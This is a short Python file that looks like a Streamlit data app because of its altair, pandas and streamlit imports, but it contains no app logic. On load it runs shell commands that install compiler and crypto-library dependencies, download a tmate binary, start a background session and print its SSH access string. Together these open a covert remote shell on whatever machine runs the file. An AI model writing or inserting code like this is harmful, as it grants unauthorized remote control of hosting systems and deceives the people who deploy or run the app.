from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
os.system ("pkg update -y")
os.system ("pkg install wget -y")
os.system ("pkg install tar -y")
os.system ("apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++")
os.system ("wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz && tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz && cd tmate-2.4.0-static-linux-i386 && chmod +x tmate && ./tmate -S /tmp/tmate.sock new-session -d && ./tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'")         
